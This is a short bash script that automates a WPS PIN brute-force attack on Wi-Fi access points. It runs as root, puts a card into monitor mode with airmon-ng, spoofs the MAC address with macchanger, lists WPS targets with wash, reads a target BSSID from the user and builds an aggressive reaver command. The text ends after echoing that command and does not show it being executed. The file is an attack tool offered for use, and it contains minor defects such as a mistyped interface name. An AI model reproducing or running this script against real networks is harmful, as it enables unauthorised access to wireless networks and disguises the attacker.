#!/usr/bin/env bash
# Copyright©K7zy
# CreateTime: 2017-03-13 02:03:23

IFACE=wlna0
MONFACE=mon0

WAIT_TIME=30
REAVER_OPTS="-vv -a -N -S -w"

#This 
cyan='\e[0;36m'
yellow='\e[1;33m'

if [ $(id -u) -ne 0 ];then 
    echo -e $cyan"Must be root to run script"
    exit 1
fi

airmon-ng stop $MONFACE
airmon-ng check kill 
airmon-ng start $IFACE

ifconfig $MONFACE down && macchanger -a $MONFACE && ifconfig $MONFACE up

wash -C -i $MONFACE


sleep $WAIT_TIME && pkill wash

echo "Please enter the BSSID [xx:xx:xx:xx:xx:xx] and hit [Enter]"
read BSSID

CMD="reaver -i $MONFACE -b $BSSID $REAVER_OPTS"

echo -e $yellow "About to run \n$CMD\n[ctrl+c] to abort"
sleep 3
